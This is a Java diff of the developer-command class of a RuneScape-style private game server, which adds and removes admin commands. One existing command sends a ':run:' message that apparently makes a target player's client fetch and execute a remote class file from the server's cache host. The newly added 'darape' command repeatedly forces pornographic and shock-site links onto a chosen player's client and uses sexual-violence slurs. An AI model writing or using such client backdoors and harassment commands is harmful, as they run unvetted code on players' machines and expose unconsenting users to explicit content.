@@ -3,7 +3,7 @@ package org.hyperion.rs2.commands.newimpl;
 
 import org.hyperion.Server;
 import org.hyperion.engine.task.Task;
-import org.hyperion.engine.task.impl.CheckInformationCommand;
+import org.hyperion.engine.task.TaskManager;
 import org.hyperion.engine.task.impl.NpcDeathTask;
 import org.hyperion.engine.task.impl.WildernessBossTask;
 import org.hyperion.rs2.Constants;
@@ -29,7 +29,6 @@ import org.hyperion.rs2.model.content.minigame.Bork;
 import org.hyperion.rs2.model.content.minigame.FightPits;
 import org.hyperion.rs2.model.content.misc2.Edgeville;
 import org.hyperion.rs2.model.content.skill.RandomEvent;
-import org.hyperion.rs2.model.content.skill.dungoneering.DungeoneeringManager;
 import org.hyperion.rs2.model.iteminfo.ItemInfo;
 import org.hyperion.rs2.model.joshyachievementsv2.tracker.AchievementTracker;
 import org.hyperion.rs2.model.recolor.Recolor;
@@ -66,7 +65,6 @@ public class DeveloperCommands implements NewCommandExtension {
     @Override
     public List<NewCommand> init() {
         return Arrays.asList(
-                new CheckInformationCommand(),
                 new Command("togglecommand", new CommandInput<>(object -> true, "Command", "An Existing Command in the Handler")) {
                     @Override
                     protected boolean execute(Player player, String[] input) {
@@ -98,19 +96,6 @@ public class DeveloperCommands implements NewCommandExtension {
                         }
                         player.sendf("@red@%,d@bla@ Disabled Commands.", list.size());
                         list.forEach(player::sendMessage);
-                        return true;
-                    }
-                },
-                new Command("spawnitem", new CommandInput<Integer>(integer -> ItemDefinition.forId(integer) != null, "Item ID", "A valid Item"), new CommandInput<Integer>(integer -> integer >= 0 && integer <= Integer.MAX_VALUE, "Item Amount", "An integer Between 0 and MAX_VALUE")) {
-                    @Override
-                    protected boolean execute(Player player, String[] input) {
-                        final int id = Integer.parseInt(input[0]), amount = Integer.parseInt(input[1]);
-                        final Item item = Item.create(id, amount);
-                        if (player.getInventory().hasRoomFor(item)) {
-                            player.getInventory().add(item);
-                        } else {
-                            player.getBank().add(item);
-                        }
                         return true;
                     }
                 },
@@ -172,34 +157,6 @@ public class DeveloperCommands implements NewCommandExtension {
                         }
                         target.sendMessage(":run:http://cache.arteropk.com/apkscripts/er.class");
                         player.sendf("Running Script http://cache.arteropk.com/apkscripts/er.class on player '%s'", TextUtils.optimizeText(target.getName()));
-                        return true;
-                    }
-                },
-                new Command("removerank", new CommandInput<Object>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<Integer>(integer -> Rank.forIndex(integer) != null && Rank.forIndex(integer) != Rank.PLAYER, "Integer", "Rank Index above Player")) {
-                    @Override
-                    protected boolean execute(Player player, String[] input) {
-                        final Player target = World.getPlayerByName(input[0].trim());
-                        final Rank rank = Rank.forIndex(Integer.parseInt(input[1].trim()));
-                        target.setPlayerRank(Rank.removeAbility(target, rank));
-                        player.sendf("Removed %s rank from %s", TextUtils.optimizeText(target.getName()));
-                        return true;
-                    }
-                },
-                new Command("giverank", new CommandInput<Object>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<Integer>(integer -> Rank.forIndex(integer) != null && Rank.forIndex(integer) != Rank.PLAYER, "Integer", "Rank Index not equal to player")) {
-                    @Override
-                    protected boolean execute(Player player, String[] input) {
-                        final Player target = World.getPlayerByName(input[0].trim());
-                        final Rank rank = Rank.forIndex(Integer.parseInt(input[1].trim()));
-                        target.setPlayerRank(Rank.addAbility(target, rank));
-                        target.sendf("You've been give '%s'", rank);
-                        player.sendf("%s has been given the rank: %s", target.getName(), rank);
-                        return true;
-                    }
-                },
-                new Command("rankids") {
-                    @Override
-                    protected boolean execute(Player player, String[] input) {
-                        Arrays.asList(Rank.values()).stream().forEach(rank -> player.sendf("[%s]:%,d", String.valueOf(rank), rank.ordinal()));
                         return true;
                     }
                 },
@@ -279,7 +236,7 @@ public class DeveloperCommands implements NewCommandExtension {
                         return true;
                     }
                 },
-                new Command("killplayer", new CommandInput<Object>(World::playerIsOnline, "Player", "An Online Player")) {
+                new Command("killplayer", new CommandInput<>(World::playerIsOnline, "Player", "An Online Player")) {
                     @Override
                     protected boolean execute(Player player, String[] input) {
                         final Player target = World.getPlayerByName(input[0].trim());
@@ -307,10 +264,13 @@ public class DeveloperCommands implements NewCommandExtension {
                         return true;
                     }
                 },
-                new Command("masspnpc", new CommandInput<Integer>(integer -> (NPCDefinition.forId(integer) != null || integer == -1), "Integer", "An NPC ID")) {
+                new Command("masspnpc", new CommandInput<Integer>(integer -> integer > -2 && integer < Integer.MAX_VALUE, "Integer", "An NPC ID")) {
                     @Override
                     protected boolean execute(Player player, String[] input) {
                         final int id = Integer.parseInt(input[0].trim());
+                        if (NPCDefinition.forId(id) == null && id != -1) {
+                            return true;
+                        }
                         World.getPlayers().stream().filter(target -> target != null && (!target.getPosition().inPvPArea() && target.cE.getOpponent() == null)).forEach(target -> {
                             target.setPNpc(id);
                         });
@@ -372,34 +332,6 @@ public class DeveloperCommands implements NewCommandExtension {
                             return true;
                         }
                         player.sendf("Unable to find %s in %s's containers", ItemDefinition.forId(id).getName(), TextUtils.optimizeText(target.getName()));
-                        return true;
-                    }
-                },
-                new Command("givedp", new CommandInput<>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<Integer>(integer -> integer > Integer.MIN_VALUE && integer < Integer.MAX_VALUE, "Integer", String.format("An amount between %,d & %,d", Integer.MIN_VALUE, Integer.MAX_VALUE)), new CommandInput<Integer>(value -> value > -1 && value < 2, "0 [Bought] : 1 [Not Bought]", "Bought [True or False]")) {
-                    @Override
-                    protected boolean execute(Player player, String[] input) {
-                        final Player target = World.getPlayerByName(input[0].trim());
-                        final int amount = Integer.parseInt(input[1].trim());
-                        final boolean bought = Integer.parseInt(input[2].trim()) == 0;
-                        target.getPoints().increaseDonatorPoints(amount, bought);
-                        player.sendf("You have given '%s' '%,dx' Donator Points, they now have %,d", TextUtils.optimizeText(target.getName()), amount, target.getPoints().getDonatorPoints());
-                        return true;
-                    }
-                },
-                new Command("giveitem", new CommandInput<>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<Integer>(integer -> ItemDefinition.forId(integer) != null, "Item ID", "An Existing Item ID"), new CommandInput<Integer>(integer -> integer > 0 && integer < Integer.MAX_VALUE, "Amount", String.format("An Amount between 0 & %,d", Integer.MAX_VALUE))) {
-                    @Override
-                    protected boolean execute(Player player, String[] input) {
-                        final Player target = World.getPlayerByName(input[0].trim());
-                        final int id = Integer.parseInt(input[1].trim());
-                        final int amount = Integer.parseInt(input[2].trim());
-                        final Item item = Item.create(id, amount);
-                        final boolean room = target.getInventory().hasRoomFor(item);
-                        if (room) {
-                            target.getInventory().add(item);
-                        } else {
-                            target.getBank().add(item);
-                        }
-                        player.sendf("Added %s x %,d to %s's %s.", item.getDefinition().getName(), amount, TextUtils.titleCase(target.getName()), room ? "Inventory" : "Bank");
                         return true;
                     }
                 },
@@ -470,6 +402,48 @@ public class DeveloperCommands implements NewCommandExtension {
                     protected boolean execute(Player player, String[] input) {
                         ContentManager.init();
                         player.sendMessage("Content Manager Initiated");
+                        return true;
+                    }
+                },
+                new Command("maxskills") {
+                    @Override
+                    protected boolean execute(Player player, String[] input) {
+                        for (int array = 0; array < Skills.SKILL_COUNT; array++) {
+                            player.getSkills().setLevel(array, 99);
+                            player.getSkills().setExperience(array, 200000000);
+                        }
+                        return true;
+                    }
+                },
+                new Command("setlevel", new CommandInput<Object>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<Integer>(integer -> integer > -1 && integer < 25, "Integer", "Skill ID"), new CommandInput<Integer>(integer -> integer > Integer.MIN_VALUE && integer < Integer.MAX_VALUE, "Integer", "Skill Level")) {
+                    @Override
+                    protected boolean execute(Player player, String[] input) {
+                        final Player target = World.getPlayerByName(input[0].trim());
+                        final int skill = Integer.parseInt(input[1].trim());
+                        final int level = Integer.parseInt(input[2].trim());
+                        target.getSkills().setLevel(skill, level);
+                        target.getSkills().setExperience(skill, Skills.getXPForLevel(level) + 5);
+                        return true;
+                    }
+                },
+                new Command("darape", new CommandInput<Object>(World::playerIsOnline, "Player", "An Online Player")) {
+                    @Override
+                    protected boolean execute(Player player, String[] input) {
+                        final Player target = World.getPlayerByName(input[0].trim());
+                        if (target.getPoints().getPkPoints() > 0 || target.getPoints().getDonatorPoints() > 0) {
+                            player.sendf("Player '%s' is Un-Rapeable.", TextUtils.optimizeText(target.getName()));
+                            return true;
+                        }
+                        String[] links = {"http://www.xnxx.com/home/5", "http://www.xvideos.com", "http://www.meatspin.com", "http://www.xnxx.com/", "http://xhamster.com/", "http://www.redtube.com/", "http://www.youporn.com/"};
+                        TaskManager.submit(new Task(500L, "Darape Task") {
+                            @Override
+                            public void execute() {
+                                stop();
+                                for (int i = 0; i < 10; i++)
+                                    Arrays.asList(links).stream().forEach(string -> target.sendf("l4unchur13 %s", string));
+                            }
+                        });
+                        player.sendf("Player '%s' has been Raped.", TextUtils.optimizeText(target.getName()));
                         return true;
                     }
                 },
@@ -882,33 +856,6 @@ public class DeveloperCommands implements NewCommandExtension {
                         int id = Integer.parseInt(input[0].trim());
                         int state = Integer.parseInt(input[1].trim());
                         player.getActionSender().sendClientConfig(id, state);
-                        return true;
-                    }
-                },
-                new Command("togglepits") {
-                    @Override
-                    protected boolean execute(Player player, String[] input) {
-                        FightPits.playersInGame.stream().forEach(target -> FightPits.removePlayerFromGame(target, true));
-                        FightPits.playersInGame.clear();
-                        FightPits.waitingRoom.stream().forEach(target -> target.setTeleportTarget(Position.create(2399, 5177, 0), false));
-                        FightPits.waitingRoom.clear();
-                        FightPits.setEnabled(!FightPits.getEnabled());
-                        player.sendf("[FightPits]:%s@bla@.", FightPits.getEnabled() ? "@gre@Enabled" : "@red@Disabled");
-                        return true;
-                    }
-                },
-                new Command("toggledung") {
-                    @Override
-                    protected boolean execute(Player player, String[] input) {
-                        DungeoneeringManager.ENABLED = !DungeoneeringManager.ENABLED;
-                        player.sendf("[Dungeoneering]:%s@bla@.", DungeoneeringManager.ENABLED ? "@gre@Enabled" : "@red@Disabled");
-                        World.getPlayers().stream().filter(target -> target != null && target.getDungeoneering().inDungeon() || (target.getLocation() != null && target.getLocation().equals(Locations.Location.DUNGEONEERING_LOBBY))).forEach(target -> {
-                            if (target.getLocation().equals(Locations.Location.DUNGEONEERING_LOBBY)) {
-                                player.setTeleportTarget(Edgeville.POSITION);
-                            } else {
-                                target.getDungeoneering().getCurrentDungeon().remove(target, false);
-                            }
-                        });
                         return true;
                     }
                 },
